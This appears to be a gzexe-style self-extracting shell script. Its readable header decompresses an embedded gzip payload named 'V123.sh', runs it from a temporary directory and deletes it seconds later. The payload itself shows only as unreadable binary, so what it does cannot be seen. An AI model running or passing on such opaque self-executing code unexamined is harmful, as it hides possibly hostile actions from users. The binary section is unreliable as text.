#!/bin/sh
skip=44

tab='	'
nl='
'
IFS=" $tab$nl"

umask=`umask`
umask 77

gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -dt`
else
  gztmpdir=/tmp/gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }

gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `echo X | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  echo >&2 "Cannot decompress $0"
  (exit 127); res=127
fi; exit $res
��(_V123.sh �[�s�F���+�t��Гe;�C`�^�i�i{L	3� �*���%�%�I�3IKJ	���@rC�P(G�~$i�"���v���Ŗl��Y�����}���{���{�=Ƌ��'X�\�ɼ���t�R�O�lA�g���+|�W$I�!-�JY�N��T_"��IB�K˗r�0)˔�W�R|���d*����ÎM�M#��t*!��$QY�a�c���F��g��$ek����d�?�:x���l��v�$^T8��t|�YS$1�L0��j/q� ��e��8@��.�o�7:�P�6� P-�3YҔ�e@��$�����������t_��n,V篢���Y�	�$F��Q#JvQ
#Ju�(�����#��QF��D�Q'��1��� ��:A4�tQ#Jw�(����h#�� F4�DG0�#� :���!�h�DC�P�vVj/�7�������reA�	��D�-�i9*�et�d���s�z�Q���?�ߚQ�T����S7��=����>�Rf�li��P�t\�R�t�e�����F)e )�p�,g�B�nQa���"�(���j�+����>�|�h�P�a'��N)1��+	p�P�5Х�J� jڳ#���|Q�SW��r��ե���<������յ��֮�R��Uuᚺ3s�����M]ެ?���8A�<�QBQSk���\[��_꛿�˗����.��y��s��_ aSi4ϗ�w���rzKa��~���+F��u�����e�$6�,�%�BU �T�hQv���,9g�u�9�T�'���4�q��b}s6��6G�P�~�jѶ������>Pͱ�,8�g�X�ǂ�SLi\�\.����m��,#8$�s�ݷ�{^�9l��g*��9M*�I���^g&�ǋ�i-��S����ޏ:�����LN�gF"�{���#��$e@�3��{_�,Vol�WP�S��k��_���y�#���o�`ڋA�K�L�$�G$8Οw|�&}m�i�d�6�M��1�������6K�,Л�J�W8�B.S�5�s�px�c��sJہ�N��ޙ��	a�.2��=s���,������Gp���<E�Ŀ]�CpH�^��6,ݸmR�E'�ཡ��W]����kK��kamh�a㋇>��w�n��|G�d���0�$J\A��2��j�9�wu.m�ͫ�ͣ��u�G�W�����/x�]��߭�n�s?��V�� Zȩ�͜��y�W�,m$���HE�|]��D���$����̌	��+�$��� �>��B��YQf[@7�D����/�y8\:t�����4�)�!h����{x#�f�y�k�"����]�K8{j���?y��G�?	�q1�K1��h2�"�&T��h*�~jj

��A�~������I���L�H+y{j7�W
��aJI�����&b)�K��W��v�.&9��J������,���˗a>a���`ҰF������'F��ۻo��?�^�f8[��E�wP
ᑍ'>x���=���Q�Uf�����8A�S�b�Br��w����g�%z��(���<.1c%	Ƒ��c>�#����X,��H�Oa�d�0:��PO�E֠d�.�z�ϔ�����W,����P�ܮ��]۾ݮ�7ΞA�-�b��N,ß��V|���=T�p%�R
��b�c{e2D@��mT׿o�-�v7j�,6�}�
�%1D��V�!��s�x^9�N�C	z�Pk��R�C��9�\̌IS�@��y���r$�Cũc@�
�������"G�*�
��Kc����4��eZV�.ߎ�=�x�x��[�k;���Q�؞�D�G�"�Me�l����q�7�(�6�d���`��9�/��#䎡P�ď�"B�0V��a�mP�eW�* @ǫ����#�%tMj��'�i��Q���<��9ż��!s�U�ra�Dx��i2?��J��"X��}�݇��v�����:� ��Kڏ?C�����Y]y��,p4>ߨm<}�sKs�����cDT@8X$��ˠ��-��m�_�ʉ��G���K�$3��?6�f�?��n]���=�bfV�X�?���4)D� �4	HӘ�Q/>'���.�����E��$��'��6�8a�o�?��CYF��; /��	H�����1�1k�t�z���C9=;��Ku�4u�$�rW8��}0�ϵ����߸b��w�z�����خ%���8i$H����}�;��h�8�V]{��Փ��ޟ��]��N���ܴJ����W�o]�
��v��YF
�=���Vpb9c'	Q�A`M�2�0�%䮡J�F��+�������9�K�{	��O��o��H�Ap4�<W�/׶/����U[��z�>����"���b�s�h����U~W�LymuC��-PH��5���z�ί��/����>�Qo߮�~��`k�������/f.������J�IU��^�z�
�ո�T]y�G�le��/v�{�#�b�_0h�L���X���o��ۘ�A��'��(��Ճk��������ߵ��Qu�_'u��;�������G�/9{�-)���W��:� L@�h@M}:�Ď�~6_�X�ڔu~�j�r^�h�R�9J�S�GB��KgK�[͂(٧�<�Щ��xH�@Z%⫛ꥇ�p[ֈ�
��5c>jh���1N�9ta�4��\Tp��?fz�u��l;�Y����Z�x�X���H��sO��w4��(~��mRz�w�Vt4�/l�QghYĚy��n.W�.���[��L
��:0�ф{��㔇���l��6�U��3��>9.�&X��qN�`�����J2/��� [��WV~?��3(�3�����l��a���+�h��zŔ��H�8c����+��1�	As���EO"d�,?ڥ.Z^�1N$�H�r[]����-{g�[W��k�n���d �wunG�x�cF^ԓg��-�.Zd�|�r �s�o��)x��&�ݧ�x"lS�p7��pn|oo�D{�o��r�K��e�[�v���9}������\�up`=��W������Dk�����g��%f����xJn��fVߢ�ܜ#��"V�"��b��S���n�嶠'L.�x�֓X�;�����F�{�L2��f���[۹#��a��zo����!*86���_��%4�	�#	w�5�����9���V�I��c���9�rf*d��ڵ����ZP��5���-O�4�>���v�Zq��ـE;*����eb�ݧ�hi\�Y��$	Nf�+��M�
H ��ɾ�G>  